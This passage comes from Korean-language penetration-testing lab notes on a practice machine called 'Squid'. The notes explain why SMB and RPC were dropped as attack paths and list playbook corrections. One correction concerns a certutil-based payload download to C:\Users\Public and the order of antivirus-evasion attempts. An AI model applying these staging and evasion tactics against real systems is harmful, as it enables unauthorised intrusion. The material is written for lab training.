**Windows 단독 호스트에서 SMB/RPC 를 «의도적으로» 버린 사례** — [[Squid]]. 외부에 135·139·445·49666·49667 이 열려 있어 반사적으로 SMB 부터 파게 되는 배치였으나, 근거를 대고 접었음:

| 신호 | 읽는 법 | 결론 |
|---|---|---|
| `Message signing enabled but not required` | NTLM 릴레이가 이론상 가능 | 릴레이는 **인증을 흘려보낼 다른 호스트**가 있어야 성립. 단독 호스트 랩에서는 쓸 곳이 없음 |
| 445 open · 자격증명 없음 | 익명 세션(`-N`)으로 공유·사용자 열거 | Server 2019 는 익명 열거 기본 차단. `[가정]` 실측 기록은 없음 |
| 49666·49667 | RPC 엔드포인트 매퍼가 넘겨준 고번호 포트 | 135 가 열리면 항상 따라붙는 부산물. 그 자체는 단서가 아님 |

**판정 기준은 하나** — 「지금 내가 가진 것으로 이 포트를 진전시킬 수 있는가」. **자격증명 없음 + SMB 는 거의 항상 막다른 길임**(익명 열거가 열린 구버전이 아니면 15분 안에 접을 것). 반면 프록시·웹은 자격증명 없이도 진전 가능한 표면이라 우선순위가 훨씬 높음.

⚠️ **「배제했다」와 「끝까지 못 해봤다」를 구분해 적을 것** — 위 표에서 1행은 배제, 2행은 미시도임.
```

**④ 지우기 전 원문** (구 §6⑩ 전체 — 표 3행 + 판단 기준 단락). 요지는 ③에 보존, 원문 인용은 `03. PG\_backup\Squid.md.bak` 956~972행.

---

## 검산 (감사 후)

- 이관 제안 **13건** — 구 §1-2 일부·§2-1/2/5/7/8·§3 CSRF·§4-3⑦·§6①③④⑤⑧⑨⑩ + 신규 시간표 1건
- 신규 2(제안 1·11) · 병합 11. `_PLAYBOOK` 의 `### B-7` 절을 실제로 확인해 B-71 하나뿐임을 근거로 제안 1 의 신규 판정 유지
- 기존 스텁 정정 1건(B-82) — Squid 발 오류가 이미 `_PLAYBOOK` 에 들어가 있었음
- ⚠️ **B-82 교체안의 「진짜 원인 = certutil 절대경로」도 확증이 아님.** 산출물은 파일명 변경과 절대경로 지정이 **동시에** 일어났음만 보여줌(`srv/go.bat` 의 `C:\Users\Public\ps.exe`) — 어느 쪽이 해결이었는지 가를 근거가 없음. 반증된 것은 **AV 파일명 시그니처 이론**뿐이고, 새 원인은 `[가정]` 등급임. 카드 본문의 회피 순서(경로 → 파일명 → …)는 두 후보 중 싼 쪽부터 시도한다는 실용 규칙으로는 그대로 유효함
- 원문 인용 누락 0건(제안 11 은 신규 계산이라 해당 없음)
